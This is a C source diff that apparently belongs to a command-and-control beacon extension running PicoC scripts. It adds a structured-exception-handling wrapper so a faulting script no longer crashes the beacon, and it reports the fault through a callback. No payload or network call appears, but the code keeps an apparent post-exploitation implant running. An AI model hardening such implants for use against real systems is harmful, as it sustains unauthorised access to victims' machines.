@@ -414,6 +414,21 @@ typedef struct {
 	void (*callback)(char * buffer, int length, int type);
 } BI_RUN_ARGS;
 
+/* SEH sandbox for the VM run - separate function because __try cannot
+ * share a frame with C++ unwinding (C2712). Returns the exception code,
+ * 0 when the run completed without a hardware fault. */
+static DWORD bi_vm_sandbox_run(Picoc * pc, char * glued)
+{
+	DWORD code = 0;
+	__try {
+		PicocParse(pc, "script.c", glued, (int)strlen(glued), TRUE, TRUE, FALSE, FALSE);
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		code = GetExceptionCode();
+	}
+	return code;
+}
+
 static void command_interpreter_impl(char * buffer, int length,
                                      void (*callback)(char * buffer, int length, int type));
 
@@ -533,7 +548,20 @@ static void command_interpreter_impl(char * buffer, int length, void (*callback)
 	}
 
 	if (PicocPlatformSetExitPoint(&pc) == 0) {
-		PicocParse(&pc, "script.c", glued, (int)strlen(glued), TRUE, TRUE, FALSE, FALSE);
+		/* VM sandbox (2026-10-19): a crashing script used to kill the whole
+		 * beacon (BAD_STACK during unwind - the dumps show UTF-16 channel
+		 * data where return addresses belong). The SEH frame lives in its
+		 * own helper so C++ unwinding objects stay legal in this frame. */
+		{
+			DWORD fault = bi_vm_sandbox_run(&pc, glued);
+			if (fault != 0 && bi_cb != NULL) {
+				char emsg[128];
+				_snprintf(emsg, sizeof(emsg) - 1,
+					"[-] interpreter: script faulted (exception 0x%08lx) - run contained\n",
+					(unsigned long)fault);
+				bi_cb(emsg, (int)strlen(emsg), CALLBACK_ERROR);
+			}
+		}
 	}
 	else {
 		char msg[128];
